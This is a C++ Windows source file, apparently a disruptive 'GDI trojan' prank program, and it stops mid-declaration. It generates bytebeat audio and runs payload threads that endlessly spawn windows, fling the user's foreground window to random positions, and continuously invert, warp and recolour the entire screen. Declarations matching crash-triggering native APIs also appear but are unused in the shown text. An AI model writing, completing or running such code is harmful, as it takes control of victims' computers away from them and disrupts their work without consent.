typedef struct IUnknown IUnknown;
#define NOMINMAX
#include <windows.h>
#include <iostream>
#define _USE_MATH_DEFINES 1
#include <cmath>
#include <algorithm>
#include <random>
#include <chrono>
#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <limits.h>
#include <cstdint>
#include <wincrypt.h>
#include <cstdlib>
#include <tchar.h>
#include <mmsystem.h>
#include <time.h>
#define PI 3.141592653
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBSH (DWORD)0x89345c
#define CUSRGB(r, g, b) (r | g << 8 | g << 16)
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635b, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5, r = n, n & 0x7fffffff; }
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
#define cmin(a, b) ((a) < (b) ? (a) : (b))
#define cmax(a, b) ((a) > (b) ? (a) : (b))
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
#define _CRT_SECURE_NO_WARNINGS   
#define WIN32_LEAN_AND_MEAN  
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
    xs = dwSeed;
}
DWORD xorshift32() {
    xs ^= xs << 13;
    xs ^= xs << 17;
    xs ^= xs << 5;
    return xs;
}
HDC g_hdcScreen = NULL;
HDC g_hdcMem = NULL;
HBITMAP g_hBmp = NULL;
RGBQUAD* g_rgbScreen = NULL;
int g_w = 0;
int g_h = 0;
#pragma comment(lib, "winmm.lib")
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "Msimg32.lib")

int astrianglewave(int y, int period, int amplitude) {
    int modulo = y % period;
    int halfperiod = period / 2;
    if (modulo < halfperiod) {
        return (4 * amplitude * modulo / period) - amplitude;
    }
    else {
        return (3 * amplitude) - (4 * amplitude * modulo / period);
    }
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = cmin(cmin(_r, _g), _b);
        FLOAT rgbMax = cmax(cmax(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgbmr(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

float smoothstep(float a, float b, float x) {
    float t = (x - a) / (b - a);
    if (t < 0)t = 0;
    if (t > 1)t = 1;
    return t * t * (3 - 2 * t);
}


float hue2rgb(float p, float q, float t)
{
    if (t < 0.0f) t += 1.0f;
    if (t > 1.0f) t -= 1.0f;
    if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
    if (t < 1.0f / 2.0f) return q;
    if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
    return p;
}

struct V3 { float x, y, z; };
struct P2 { int x, y; };

COLORREF HueToRGB(float hue) {
    float h = hue / 60.0f;
    float x = 1.0f - fabsf(fmodf(h, 2.0f) - 1.0f);

    float r = 0, g = 0, b = 0;
    if (h >= 0 && h < 1) { r = 1.0f; g = x;    b = 0; }
    else if (h >= 1 && h < 2) { r = x;    g = 1.0f; b = 0; }
    else if (h >= 2 && h < 3) { r = 0;    g = 1.0f; b = x; }
    else if (h >= 3 && h < 4) { r = 0;    g = x;    b = 1.0f; }
    else if (h >= 4 && h < 5) { r = x;    g = 0;    b = 1.0f; }
    else { r = 1.0f; g = 0;    b = x; }

    return RGB((int)(r * 255), (int)(g * 255), (int)(b * 255));
}



HSL rgb2hsl2(RGBQUAD px) {
    HSL out;
    float R = px.rgbRed / 255.0f;
    float G = px.rgbGreen / 255.0f;
    float B = px.rgbBlue / 255.0f;

    float maxv = fmaxf(R, fmaxf(G, B));
    float minv = fminf(R, fminf(G, B));
    float delta = maxv - minv;

    out.l = (maxv + minv) * 0.5f;

    if (delta < 0.00001f) {
        out.h = 0.0f;
        out.s = 0.0f;
        return out;
    }

    out.s = (out.l < 0.5f)
        ? (delta / (maxv + minv))
        : (delta / (2.0f - maxv - minv));

    if (maxv == R)
        out.h = (G - B) / delta;
    else if (maxv == G)
        out.h = 2.0f + (B - R) / delta;
    else
        out.h = 4.0f + (R - G) / delta;

    out.h *= 60.0f;
    if (out.h < 0.0f) out.h += 360.0f;

    return out;
}

void HSLtoRGB2(float H, float S, float L, int* r, int* g, int* b) {
    float R, G, B;

    H = fmodf(H, 360.0f);
    if (H < 0.0f) H += 360.0f;
    H /= 360.0f;

    if (S <= 0.0f) {
        R = G = B = L;
    }
    else {
        float q = (L < 0.5f) ? (L * (1.0f + S)) : (L + S - L * S);
        float p = 2.0f * L - q;

        R = hue2rgb(p, q, H + 1.0f / 3.0f);
        G = hue2rgb(p, q, H);
        B = hue2rgb(p, q, H - 1.0f / 3.0f);
    }

    *r = (int)(R * 255.0f);
    *g = (int)(G * 255.0f);
    *b = (int)(B * 255.0f);
}

RGBQUAD hsl2rgb2(HSL hsl) {
    int r, g, b;
    HSLtoRGB2(hsl.h, hsl.s, hsl.l, &r, &g, &b);

    RGBQUAD out;
    out.rgbRed = (BYTE)r;
    out.rgbGreen = (BYTE)g;
    out.rgbBlue = (BYTE)b;
    out.rgbReserved = 0;
    return out;
}

void sound1(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (((t >> 9) >> (t >> 9) * (t >> 2)))
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound2(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            t * (t >> 9) >> (t >> 3)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound3(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (t >> 5) * (t >> 3) >> (t & 1)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound4(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            t * (t >> 8 | t << 5)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound5(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            t * sin(t >> 9 | t >> 2 | t * 11)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound6(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (t >> 8) * (t << 5) >> (t & 13)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound7(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
           t * rand()
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}





LRESULT CALLBACK WndProc2(HWND h, UINT m, WPARAM w, LPARAM l)
{
    if (m == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(h, m, w, l);
}

DWORD WINAPI payloadspam(LPVOID lpParam)
{
    HINSTANCE h = GetModuleHandle(0);

    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc2;
    wc.hInstance = h;
    wc.lpszClassName = "dor";
    RegisterClassA(&wc);

    srand((unsigned)time(0));

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    MSG msg;

    for (;;)
    {
        int x = rand() % (sw - 500);
        int y = rand() % (sh - 500);

        HWND w = CreateWindowExA(
            0,
            "dor",
            "",
            WS_OVERLAPPEDWINDOW | WS_VISIBLE,
            x,
            y,
            750,
            320,
            0,
            0,
            h,
            0
        );

        Sleep(rand() % 3000);


        while (PeekMessage(&msg, 0, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return 0;
}

DWORD WINAPI windowfff(LPVOID lpParam)
{
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1)
    {
        HWND hwnd = GetForegroundWindow();
        SetWindowPos(hwnd, 0, rand() % w, rand() % h, rand() % w, rand() % h, SWP_SHOWWINDOW);
        DeleteObject(hwnd);
        Sleep(rand() % 10);
    }
}

DWORD WINAPI shader1(LPVOID lpParam) {
    while (1) {
        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 6, ySize = 8;
        HDC hdc;
        hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, screenshot);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < sw + 10; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
            BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
        }
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
        Sleep(1);
        ReleaseDC(0, hdc);
        DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
    }
}

DWORD WINAPI shader1or1(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN),
            h = GetSystemMetrics(SM_CYSCREEN);

        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI shader2(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, -30, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader2or1(LPVOID lpParam) {
    HDC screen = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC memdc = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
    SelectObject(memdc, bmp);

    RGBQUAD* buf = (RGBQUAD*)malloc(w * h * sizeof(RGBQUAD));
    int millisecTimeout = 200;
    float alpha = 0.25f;

    while (true) {
        BitBlt(memdc, 0, 0, w, h, screen, 0, 0, SRCCOPY);
        GetBitmapBits(bmp, w * h * sizeof(RGBQUAD), buf);

        HSL hsl;
        hsl.h = (float)((rand() % 10000) / 10000.0f);
        hsl.s = 1.0f;
        hsl.l = 0.5f;
        RGBQUAD filt = hsl2rgb2(hsl);

        for (int i = 0; i < w * h; i++) {
            RGBQUAD s = buf[i];
            RGBQUAD d;
            d.rgbRed = (BYTE)(s.rgbRed * (1.0f - alpha) + filt.rgbRed * alpha);
            d.rgbGreen = (BYTE)(s.rgbGreen * (1.0f - alpha) + filt.rgbGreen * alpha);
            d.rgbBlue = (BYTE)(s.rgbBlue * (1.0f - alpha) + filt.rgbBlue * alpha);
            d.rgbReserved = 0;
            buf[i] = d;
        }

        SetBitmapBits(bmp, w * h * sizeof(RGBQUAD), buf);
        BitBlt(screen, 0, 0, w, h, memdc, 0, 0, SRCCOPY);

        Sleep(millisecTimeout);
    }

    return 0;
}

DWORD WINAPI shader2Cube(LPVOID lpParam) {
    const int Steps = 6;
    const int MAX_PUNTI = Steps * Steps * 6;
    V3 v[MAX_PUNTI];
    int idx = 0;

    for (int i = 0; i < Steps; ++i) {
        float a = -1.0f + (static_cast<float>(i) / (Steps - 1)) * 2.0f;
        for (int j = 0; j < Steps; ++j) {
            float b = -1.0f + (static_cast<float>(j) / (Steps - 1)) * 2.0f;

            if (idx < MAX_PUNTI) v[idx++] = { a, b,  1.0f };
            if (idx < MAX_PUNTI) v[idx++] = { a, b, -1.0f };
            if (idx < MAX_PUNTI) v[idx++] = { a,  1.0f, b };
            if (idx < MAX_PUNTI) v[idx++] = { a, -1.0f, b };
            if (idx < MAX_PUNTI) v[idx++] = { 1.0f, a, b };
            if (idx < MAX_PUNTI) v[idx++] = { -1.0f, a, b };
        }
    }

    float cx = 400.0f, cy = 300.0f;
    float vx = 4.0f, vy = 3.0f;
    float ang = 0.0f;

    const float RAGGIO_NORMALE = 12.0f;
    const int GRIGIO_BASE = 50;

    HPEN hBlackPen = CreatePen(PS_SOLID, 3, RGB(0, 0, 0));

    while (1) {
        HDC hdc = GetDC(NULL);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        cx += vx;
        cy += vy;
        if (cx < 150 || cx > sw - 150) vx = -vx;
        if (cy < 150 || cy > sh - 150) vy = -vy;

        ang += 0.02f;

        float c1 = cosf(ang), s1 = sinf(ang);
        float c2 = cosf(ang * 0.7f), s2 = sinf(ang * 0.7f);

        HGDIOBJ oldPen = SelectObject(hdc, hBlackPen);

        for (int i = 0; i < idx; i++) {
            float x = v[i].x, y = v[i].y, z = v[i].z;

            float y1 = y * c2 - z * s2;
            float z1 = y * s2 + z * c2;
            float x1 = x * c1 - z1 * s1;
            float z2 = x * s1 + z1 * c1;

            float f = 3.5f / (3.5f + z2);
            int proj_x = (int)(cx + x1 * 130 * f);
            int proj_y = (int)(cy + y1 * 130 * f);

            if (proj_y < 0) proj_y = 0;
            if (proj_y > sh) proj_y = sh;

            float hue = (static_cast<float>(proj_y) / static_cast<float>(sh)) * 360.0f;
            COLORREF colorHsl = HueToRGB(hue);

            int r_mix = (GetRValue(colorHsl) * 35 + GRIGIO_BASE * (255 - 35)) / 255;
            int g_mix = (GetGValue(colorHsl) * 35 + GRIGIO_BASE * (255 - 35)) / 255;
            int b_mix = (GetBValue(colorHsl) * 35 + GRIGIO_BASE * (255 - 35)) / 255;

            HBRUSH hBrush = CreateSolidBrush(RGB(r_mix, g_mix, b_mix));
            HGDIOBJ oldBrush = SelectObject(hdc, hBrush);

            float fattore_scala = 0.75f + (fmodf(static_cast<float>(i) * 0.1f + ang, 1.0f) * 0.2f);
            int raggio = (int)(RAGGIO_NORMALE * fattore_scala * f);

            Ellipse(hdc, proj_x - raggio, proj_y - raggio, proj_x + raggio, proj_y + raggio);

            SelectObject(hdc, oldBrush);
            DeleteObject(hBrush);
        }

        SelectObject(hdc, oldPen);
        ReleaseDC(NULL, hdc);
        Sleep(15);
    }

    DeleteObject(hBlackPen);
    return 0;
}
DWORD WINAPI shader3or2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    for (int i = 0; i < 10000; ++i) {
        int x1 = rand() % GetSystemMetrics(SM_CXSCREEN);
        int y1 = rand() % GetSystemMetrics(SM_CYSCREEN);
        int x2 = x1 + 300;
        int y2 = y1 + 300;
        BitBlt(hdc, x1, y1, x2 - x1, y2 - y1, hdc, x1, y1, NOTSRCCOPY);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI shader4(LPVOID lpParam) {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    int wavePeriod = 60;
    int waveAmplitude = 12;

    while (1) {
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hbmMem = CreateCompatibleBitmap(hdcScreen, width, height);
        HGDIOBJ hOldObj = SelectObject(hdcMem, hbmMem);

        BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

        for (int y = 0; y < height; ++y) {
            int shift = astrianglewave(y, wavePeriod, waveAmplitude);
            BitBlt(hdcScreen, shift, y, width, 1, hdcMem, 0, y, SRCCOPY);
        }

        SelectObject(hdcMem, hOldObj);
        DeleteObject(hbmMem);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);

        Sleep(10);
    }

    return 0;
}

DWORD WINAPI shader4or1(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
            rgbScreen[i].rgb = rgbScreen[i].rgb ^ (RGB(255, 255, 255));
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        Sleep(150);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

DWORD WINAPI shader5(LPVOID lpThread)
{
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double moveangle = 0;
    while (1) {
        SeedXorshift32(__rdtsc());
        desk = GetDC(0);
        SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
        int ax = (int)(cos(moveangle) * 5.0);
        int ay = (int)(sin(moveangle) * 5.0);
        int w = xorshift32() % sh, h = sh / 2 - xorshift32() % sh / 3;
        BitBlt(desk, 0, w, sw, h, desk, 0 + xorshift32() % 21 - 10, w, SRCPAINT ^ PATCOPY);
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(desk, 0, 0, sw, sh, desk, 0, 0, sw, sh, blend);
        moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
        if (((xorshift32() % 4 == 1))) InvalidateRect(0, 0, 0);
        Sleep(xorshift32() % 100);
    }
}

DWORD WINAPI shader5or1(LPVOID lpThread)
